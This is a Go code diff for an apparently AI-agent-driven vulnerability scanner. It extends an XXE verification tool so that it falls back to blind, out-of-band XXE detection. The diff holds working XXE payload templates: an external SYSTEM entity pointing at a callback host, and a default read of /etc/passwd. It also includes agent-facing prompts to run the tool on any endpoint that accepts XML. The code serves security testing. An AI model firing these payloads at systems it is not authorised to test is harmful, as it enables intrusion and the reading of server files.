@@ -37,7 +37,9 @@ import (
 	"net/url"
 	"regexp"
 	"strings"
+	"time"
 
+	oobsrv "github.com/xalgord/xalgorix/v4/internal/oob"
 	"github.com/xalgord/xalgorix/v4/internal/scanctx"
 	"github.com/xalgord/xalgorix/v4/internal/scopeguard"
 	"github.com/xalgord/xalgorix/v4/internal/tools"
@@ -47,7 +49,7 @@ import (
 func (a *Agent) registerVerifyXXETool(reg *tools.Registry) {
 	reg.Register(&tools.Tool{
 		Name:        "verify_xxe",
-		Description: "Deterministically CONFIRM XML External Entity (XXE) injection on an endpoint that parses a POSTed XML document (the XXE sibling of verify_sqli/verify_ssti). Give it a ledger hypothesis_id OR a url. It POSTs a benign baseline XML and then an XXE payload — a DOCTYPE declaring an external entity that reads a local file (default file:///etc/passwd) and references it in the body — and confirms XXE when the file's contents appear in the probe response but NOT in the baseline (a parser with external entities disabled echoes the literal entity, never the file). On success it records exploit-proven evidence in the ledger; report it as High CWE-611 (paste the leaked file content). Uses the scan session auth, does not follow redirects, disabled in passive mode. Reach for it the moment you find an endpoint that accepts XML (import/upload/SOAP/SAML).",
+		Description: "Deterministically CONFIRM XML External Entity (XXE) injection on an endpoint that parses a POSTed XML document (the XXE sibling of verify_sqli/verify_ssti). Give it a ledger hypothesis_id OR a url. It POSTs a benign baseline XML and then an XXE payload — a DOCTYPE declaring an external entity that reads a local file (default file:///etc/passwd) and references it in the body — and confirms XXE when the file's contents appear in the probe response but NOT in the baseline (a parser with external entities disabled echoes the literal entity, never the file). On success it records exploit-proven evidence in the ledger; report it as High CWE-611 (paste the leaked file content). When the endpoint parses XML but never reflects entity content (the common blind-XXE shape), it AUTOMATICALLY escalates: it plants an out-of-band (OAST/interactsh) callback URL in an external SYSTEM entity and confirms XXE from the target-originated callback. Uses the scan session auth, does not follow redirects, disabled in passive mode. Reach for it the moment you find an endpoint that accepts XML (import/upload/SOAP/SAML).",
 		Parameters: []tools.Parameter{
 			{Name: "url", Description: "Absolute URL (scheme://host/path) or path of the XML-accepting endpoint. One of url or hypothesis_id is required.", Required: false},
 			{Name: "hypothesis_id", Description: "Optional ledger hypothesis id carrying an HTTP path (e.g. H-7); its endpoint is used when 'url' is not given.", Required: false},
@@ -148,6 +150,16 @@ func (a *Agent) verifyXXETool(args map[string]string) (tools.Result, error) {
 	}
 
 	if !confirmed {
+		// Many XXE sinks parse the document but never reflect entity content,
+		// so an in-band file-read probe reports nothing (observed in production:
+		// an endpoint with a proven entity-resolving parser was declared XXE
+		// negative). Escalate automatically to blind XXE: plant the OAST
+		// callback URL in an external SYSTEM entity and confirm from the
+		// target-originated callback, mirroring verify_oob's provenance rules.
+		blindResult := a.blindXXEVerify(method, absURL, headers, endpoint, authTag)
+		if blindResult != nil {
+			return *blindResult, nil
+		}
 		return tools.Result{
 			Output:   fmt.Sprintf("XXE NOT confirmed at %s%s: %s", endpoint, authTag, note),
 			Metadata: map[string]any{"xxe_confirmed": false, "endpoint": endpoint},
@@ -229,4 +241,96 @@ func looksLikeFileLeak(body, _ string) bool {
 		return true
 	}
 	return passwdLineRe.MatchString(body)
+}
+
+// blindXXEVerify escalates an in-band XXE negative to a blind confirmation.
+// It mints an OAST callback, sends an XML document whose external SYSTEM entity
+// references the callback, polls the interaction store, and applies verify_oob's
+// provenance rules (non-scanner HTTP confirms at 0.9, DNS at 0.75). Returns nil
+// when blind testing is unavailable (OAST not configured) or produced no
+// interactions, leaving the caller's in-band negative in effect.
+func (a *Agent) blindXXEVerify(method, absURL string, headers map[string]string, endpoint, authTag string) *tools.Result {
+	if !oobsrv.Enabled() {
+		return nil
+	}
+	if stop := a.injectionRateGate(); stop != "" {
+		return nil
+	}
+	callbackURL, token, err := oobsrv.Generate()
+	if err != nil || callbackURL == "" {
+		return nil
+	}
+	blindBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM %q>]><data>&xxe;</data>`, callbackURL)
+	if _, _, bErr := a.sendXMLProbe(method, absURL, headers, blindBody); bErr != nil {
+		return nil
+	}
+
+	// Poll for the callback: entity fetches are fast when egress allows HTTP,
+	// and DNS-only egress still resolves the callback host.
+	var hits []oobsrv.Interaction
+	for _, wait := range []time.Duration{3 * time.Second, 4 * time.Second, 5 * time.Second} {
+		time.Sleep(wait)
+		hits = oobsrv.Poll(token)
+		if len(hits) > 0 {
+			break
+		}
+	}
+	if len(hits) == 0 {
+		return nil
+	}
+
+	t := tallyOOB(hits)
+	confirmed := false
+	confidence := 0.0
+	verdict := ""
+	switch {
+	case t.nonScannerHTTP > 0:
+		confirmed, confidence = true, 0.9
+		verdict = fmt.Sprintf("the target fetched the external SYSTEM entity out-of-band (assessed non-scanner HTTP callback) — the parser resolves external entities (blind XXE, CWE-611)")
+	case t.dns > 0:
+		confirmed, confidence = true, 0.75
+		verdict = fmt.Sprintf("the target's resolver looked up the callback host planted in the external entity (DNS callback) — the parser resolves external entities (blind XXE, CWE-611)")
+	default:
+		verdict = "only scanner-origin / origin-unassessed interactions arrived — not attributable to the target"
+	}
+	if !confirmed {
+		return nil
+	}
+
+	confirm := fmt.Sprintf("XML External Entity injection CONFIRMED (blind) at %s%s: %s.", endpoint, authTag, verdict)
+	if l := a.ledger(); l != nil {
+		h := l.Upsert(scanctx.Hypothesis{
+			Title:      "XML External Entity injection (blind) at " + endpoint,
+			VulnClass:  "xxe",
+			Endpoint:   endpoint,
+			Target:     baseURLOf(u_MustParse(absURL)),
+			Confidence: confidence,
+			Status:     scanctx.HypothesisTesting,
+			Origin:     "verify_xxe",
+			NextAction: "Report as High XML External Entity injection (CWE-611) using the target-originated OAST callback as proof; in-band file read may also be possible — try escalating with a file:// entity. Link the finding via add_hypothesis_evidence(kind=finding_ref).",
+		})
+		l.AddEvidence(h.ID, scanctx.Evidence{
+			Kind:       "exploit",
+			Summary:    confirm,
+			Request:    fmt.Sprintf("%s %s (blind external-entity payload, OAST token %s)", method, absURL, token),
+			Response:   firstHitSummary(hits),
+			Confidence: confidence,
+			AgentID:    a.ledgerOrigin(),
+		})
+		return &tools.Result{
+			Output:   confirm + fmt.Sprintf(" Recorded exploit-proven in the ledger (%s) — report it as High CWE-611 and link the finding.", h.ID),
+			Metadata: map[string]any{"xxe_confirmed": true, "xxe_blind": true, "endpoint": endpoint, "hypothesis_id": h.ID},
+		}
+	}
+	return &tools.Result{
+		Output:   confirm,
+		Metadata: map[string]any{"xxe_confirmed": true, "xxe_blind": true, "endpoint": endpoint},
+	}
+}
+
+// u_MustParse parses rawURL for target bookkeeping where failure is impossible
+// (the caller already url.Parse'd it successfully).
+func u_MustParse(rawURL string) *url.URL {
+	u, _ := url.Parse(rawURL)
+	return u
 }
